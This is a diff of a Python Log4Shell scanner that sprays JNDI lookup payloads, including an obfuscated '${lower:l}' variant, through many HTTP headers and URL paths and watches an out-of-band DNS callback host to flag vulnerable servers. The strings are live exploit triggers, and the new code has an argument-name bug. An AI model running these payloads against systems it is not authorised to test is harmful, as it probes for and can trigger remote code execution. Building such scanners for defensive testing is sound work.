@@ -1,56 +1,109 @@
-from concurrent.futures import ThreadPoolExecutor
-import argparse
+
+#!/usr/bin/python3
 import requests
-from datetime import datetime
-
-requests.packages.urllib3.disable_warnings()
+import uuid
+import logging
+import urllib3
+import time
+import argparse
 import colorama
-colorama.init(autoreset=True)
 
-# ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xxx.interactsh.com/pocrequest}
+colorama.init(autoreset = True)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+logging.basicConfig(level=logging.INFO)
+
+# Change this to your DNS zone
+HOSTNAME = "c8uqb291r1j0o5dp1h40g9fnfcts3kuzx.oast.fun"
+
+header_injects = [
+    'X-Api-Version',
+    'User-Agent',
+    'Referer',
+    'X-Druid-Comment',
+    'Origin',
+    'Location',
+    'X-Forwarded-For',
+    'Cookie',
+    'X-Requested-With',
+    'X-Forwarded-Host',
+    'Accept'
+]
+
+prefixes_injects = [
+    'jndi:rmi',
+    'jndi:ldap',
+    'jndi:dns',
+    'jndi:${lower:l}${lower:d}ap'
+]
+
+def send_request(url, headers={}, timeout=5):
+    try:
+        """
+        Check inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
+        """
+        requests.get(
+            url,
+            headers=headers,
+            verify=False,
+            timeout=timeout
+        )
+    except requests.exceptions.ConnectionError as e:
+        logging.error(f"HTTP connection to target URL error: {e}")
+    except requests.exceptions.Timeout:
+        logging.error("HTTP request timeout")
+    except (requests.exceptions.InvalidURL, urllib3.exceptions.LocationParseError) as e:
+        logging.error(f"Failed to parse URL: {e}")
+
+def check_urls(urls, wait, timeout):
+    url_identifiers=dict()
+
+    for url in urls:
+        url_identifiers[url] = uuid.uuid4()
+        logging.debug(f"Generated UUID: {url_identifiers[url]} for {url}")
+        logging.info(f"{colorama.Fore.YELLOW}Sending requests to {url} using header injection...")
+
+        # Check 1 (Header fields)
+        for header in header_injects:
+            for prefix in prefixes_injects:
+                logging.info(f"Trying prefix {prefix} with header {header}")
+                headers = {header: f'${{{prefix}://{url_identifiers[url]}.{HOSTNAME}/test.class}}'}
+                send_request(url=url, headers=headers, timeout=timeout)
+
+        # Check 2 (Get request)
+        logging.info(f"{colorama.Fore.YELLOW}Sending requests to {url} using GET request injection")
+        for prefix in prefixes_injects:
+            logging.info(f"Trying prefix {prefix}")
+            send_request(url=f"{url}/${{{prefix}://{url_identifiers[url]}.{HOSTNAME}/test.class}}", timeout=timeout)
+
+    logging.info(f"Waiting {wait} seconds for responses")
+    time.sleep(wait)
+
+    for url in urls:
+        logging.info(f"Checking DNS log file for requests for {url} (indicating a vulnerable system)...")
+        with open('/opt/git/interactsh/cmd/interactsh-client/log.txt') as f:
+            if f"{url_identifiers[url]}" in f.read():
+                logging.info(f"{colorama.Fore.RED}VULNERABLE! System at {url} is potentially vulnerable as we have seen an incoming DNS request to {url_identifiers[url]}.{HOSTNAME}")
+            else:
+                logging.info(f"{colorama.Fore.GREEN}NO VULNERABILITY DETECTED! Proceed with on-server checking. No incoming DNS request to {url_identifiers[url]}.{HOSTNAME} was seen while checking system at {url}")
 
 def main():
-    http = "https://"
-    with open(input_file, "r") as myfile:
-        content = myfile.readlines()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--input_list", help="A text file with a list of URLs to check (one url per line)")
+    parser.add_argument("-u", "--url", help="URL to check (for example: http://yoururl.com)")
+    parser.add_argument("-w", "--wait", type=int, default=15, help="Number of seconds to wait before checking DNS logs (default: 15)")
+    parser.add_argument("-t", "--timeout", type=int, default=5, help="HTTP timeout in seconds to use (default: 5)")
+    args = parser.parse_args()
 
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            for url in content:
-                if url.startswith("http"):
-                    http = ""
-                # only use url and not banner
-                if "," in url:
-                    url_array = url.split(",")
-                    url = url_array[0]
-                executor.submit(start_poc, http + url.strip())
+    if(args.url):
+        urls = [args.url]
+    elif(args.list):
+        with open(args.list) as f:
+            urls = f.read().splitlines()
+    else:
+        parser.print_help()
+        exit(1)
 
-def start_poc(input_url):
-    try:
-        url = input_url
-        session = requests.session()
-        session.headers[
-            "User-Agent"
-        ] = "${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.c6rens5cefo0bvo539ngcg5qzhyyyyyyn.interactsh.com/pocrequest}"
-        response = session.get(
-            url=url,
-            timeout=5,
-            verify=False,
-        )
-        session.close()
-
-        if response.status_code == 200:
-            print(colorama.Fore.GREEN + url)
-
-    except requests.exceptions.ConnectionError:
-        pass
+    check_urls(urls, wait=args.wait, timeout=args.timeout)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="Check websites for log4j vulns."
-    )
-    parser.add_argument(
-        "-i", type=str, default="./input.txt", help="Path to input file"
-    )
-    args = parser.parse_args()
-    input_file = args.i
     main()
